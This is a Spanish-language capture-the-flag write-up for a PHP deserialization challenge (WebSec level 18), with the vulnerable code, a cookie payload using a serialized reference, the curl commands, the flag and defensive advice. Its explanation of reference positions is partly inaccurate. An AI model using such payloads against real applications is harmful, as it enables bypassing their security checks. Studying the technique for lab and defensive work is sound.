# SOLUCIÓN WEBSEC LEVEL18 - PHP Object References

## FLAG
```
WEBSEC{You_have_impressive_refrences._We'll_call_you_back.}
```

## RESUMEN DE LA VULNERABILIDAD

La aplicación deserializa objetos PHP de una cookie controlada por el usuario y luego compara dos propiedades del objeto. La vulnerabilidad permite usar **referencias de objetos en PHP** para hacer que ambas propiedades apunten al mismo valor.

## CÓDIGO VULNERABLE

```php
include "flag.php";

// Establece cookie con objeto serializado
if (isset($_POST['obj'])) {
    setcookie('obj', $_POST['obj']);
} elseif (!isset($_COOKIE['obj'])) {
    $obj = new stdClass;
    $obj->input = 1234;
    setcookie('obj', serialize($obj));
}

// Deserializa y verifica
if (isset($_COOKIE['obj'])) {
    $obj = $_COOKIE['obj'];
    $unserialized_obj = unserialize($obj);  // ⚠️ VULNERABLE
    $unserialized_obj->flag = $flag;        // Asigna la flag real
    
    // Si input == flag, muestra la flag
    if (hash_equals($unserialized_obj->input, $unserialized_obj->flag))
        echo 'Here is your flag: ' . $flag;
    else
        echo 'is an invalid object, sorry.';
}
```

## ANÁLISIS

### El desafío:

1. El código deserializa un objeto de la cookie
2. Añade una propiedad `flag` con el valor real de la flag
3. Compara si `$obj->input === $obj->flag`
4. Si son iguales → muestra la flag
5. **Problema**: No sabemos el valor de la flag para ponerlo en `input`

### La solución - Referencias de objetos PHP:

PHP permite crear **referencias** entre propiedades de objetos en la serialización. Una referencia hace que dos propiedades apunten al mismo valor en memoria.

Formato de serialización:
```php
// Normal
O:8:"stdClass":1:{s:5:"input";i:1234;}

// Con referencia
O:8:"stdClass":2:{s:4:"flag";N;s:5:"input";R:2;}
```

Donde:
- `O:8:"stdClass"` = Objeto de clase stdClass
- `2` = Número de propiedades
- `s:4:"flag"` = String "flag" (4 caracteres)
- `N` = NULL (valor inicial)
- `s:5:"input"` = String "input" (5 caracteres)
- `R:2` = **Referencia a la propiedad #2** (flag)

### Cómo funciona:

1. Enviamos objeto serializado: `O:8:"stdClass":2:{s:4:"flag";N;s:5:"input";R:2;}`
2. PHP deserializa:
   - `flag = NULL`
   - `input = Referencia a flag`
3. El código hace: `$obj->flag = $flag_real`
4. Como `input` es una referencia a `flag`, ¡`input` también se actualiza!
5. Ahora: `input === flag` → TRUE ✓
6. La flag se muestra

## EXPLOTACIÓN

### Paso 1: Entender el formato de serialización

Cookie inicial:
```
O:8:"stdClass":1:{s:5:"input";i:1234;}
```

Desglose:
- `O:8:"stdClass"` = Objeto stdClass
- `1` = 1 propiedad
- `s:5:"input"` = Propiedad "input" (string de 5 chars)
- `i:1234` = Valor entero 1234

### Paso 2: Crear payload con referencias

```php
O:8:"stdClass":2:{s:4:"flag";N;s:5:"input";R:2;}
```

Desglose:
- `2` = 2 propiedades
- Primera: `s:4:"flag";N` → flag = NULL
- Segunda: `s:5:"input";R:2` → input = Referencia a propiedad #2 (flag)

**Importante**: El orden importa. `flag` debe definirse ANTES de crear la referencia.

### Paso 3: URL encode y enviar

```bash
PAYLOAD='O:8:"stdClass":2:{s:4:"flag";N;s:5:"input";R:2;}'
ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")

curl "https://websec.fr/level18/index.php" \
  --cookie "obj=$ENCODED"
```

URL encoded:
```
O%3A8%3A%22stdClass%22%3A2%3A%7Bs%3A4%3A%22flag%22%3BN%3Bs%3A5%3A%22input%22%3BR%3A2%3B%7D
```

### Paso 4: ¡Flag obtenida!

Resultado:
```html
<div class="alert alert-success">
    Here is your flag: <mark>WEBSEC{You_have_impressive_refrences._We'll_call_you_back.}</mark>
</div>
```

## REFERENCIAS EN PHP SERIALIZATION

### Sintaxis de referencias:

- `R:N` = Referencia a la propiedad en posición N (1-indexed)
- `r:N` = Referencia recursiva (menos común)

### Ejemplo de referencias:

```php
// Crear objeto con referencias
$obj = new stdClass;
$obj->a = "test";
$obj->b = &$obj->a;  // b es referencia a a
echo serialize($obj);
// Output: O:8:"stdClass":2:{s:1:"a";s:4:"test";s:1:"b";R:2;}
```

### Cómo PHP cuenta las posiciones:

```
O:8:"stdClass":3:{
    s:1:"a";s:4:"test";  <- Posición 1
    s:1:"b";i:123;        <- Posición 2  
    s:1:"c";R:2;          <- Referencia a posición 2 (b)
}
```

## TIPOS DE SERIALIZACIÓN PHP

### Valores primitivos:
- `N` = NULL
- `b:0` o `b:1` = Boolean false/true
- `i:123` = Integer
- `d:1.5` = Double/Float
- `s:4:"text"` = String (longitud:valor)

### Objetos y arrays:
- `O:8:"stdClass":N:{...}` = Objeto (clase:propiedades)
- `a:2:{...}` = Array (tamaño:{elementos})

### Referencias:
- `R:N` = Referencia a posición N
- `r:N` = Referencia recursiva

## LECCIONES APRENDIDAS

1. **unserialize() es peligroso**:
   - Nunca deserializar datos del usuario sin validación
   - Puede llevar a Object Injection, RCE, etc.
   - Usar JSON en su lugar cuando sea posible

2. **Referencias en PHP son poderosas**:
   - Permiten que múltiples variables apunten al mismo valor
   - En serialización, pueden usarse para bypass de validaciones
   - Pueden crear comportamientos inesperados

3. **Orden de propiedades importa**:
   - En serialización con referencias, el orden es crítico
   - La propiedad referenciada debe definirse ANTES
   - PHP procesa secuencialmente al deserializar

4. **Comparaciones después de deserializar**:
   - Si se comparan propiedades del objeto deserializado
   - Y el código modifica alguna antes de comparar
   - Referencias pueden hacer que ambas tengan el mismo valor

5. **Defense in depth**:
   - No confiar en comparaciones simples para seguridad
   - Validar estructura del objeto antes de usar
   - Considerar usar `hash_hmac()` con secret key
   - Mejor: no usar serialización para datos del usuario

## ALTERNATIVAS SEGURAS

### En lugar de unserialize():

```php
// ❌ MAL - Deserializar input del usuario
$obj = unserialize($_COOKIE['data']);

// ✅ BIEN - Usar JSON
$obj = json_decode($_COOKIE['data']);

// ✅ MEJOR - Validar firma
$data = json_decode($_COOKIE['data'], true);
$signature = $_COOKIE['signature'];
if (hash_equals(hash_hmac('sha256', $_COOKIE['data'], SECRET), $signature)) {
    // Datos válidos
}
```

### Para almacenar objetos en cookies:

```php
// ✅ Usar JSON + firma
$data = json_encode($obj);
$signature = hash_hmac('sha256', $data, SECRET_KEY);
setcookie('data', $data);
setcookie('sig', $signature);
```

## COMANDO COMPLETO

```bash
curl -s "https://websec.fr/level18/index.php" \
  --cookie "obj=O%3A8%3A%22stdClass%22%3A2%3A%7Bs%3A4%3A%22flag%22%3BN%3Bs%3A5%3A%22input%22%3BR%3A2%3B%7D" \
| grep -oP 'WEBSEC\{[^}]+\}'
```

## ARCHIVOS CREADOS
- `codigo_fuente.php` - Código limpio
- `analisis.txt` - Análisis de la vulnerabilidad
- `payload.txt` - Payload serializado
- `cookies.txt` - Cookies del servidor
- `FLAG.txt` - La flag obtenida
- `SOLUCION.md` - Este archivo